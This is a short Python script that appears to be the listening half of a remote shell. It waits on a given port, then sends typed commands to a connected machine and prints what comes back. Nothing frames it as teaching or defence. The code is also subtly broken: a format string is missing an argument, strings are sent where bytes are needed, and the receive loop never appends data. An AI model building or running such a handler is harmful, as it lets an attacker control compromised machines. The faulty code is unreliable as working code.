import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print("...Listening process... %s:%d" % (host, port))
conn, addr = s.accept()

print("[+]... Connection established successful %s %s" % (str(addr[0])))
while 1:
    command = input("#>")
    if command != "exit()":
        if command == "": continue
        conn.send(command)
        result = conn.recv(1024)
        total_size = float(result[:16])
        result = result[16:]
        while total_size > len(result):
            data = conn.recv(1024)
            result + data
        print(result.rstrip("\n"))
    else:
        conn.send("exit()")
        print("Connection closing")
        break
s.close()
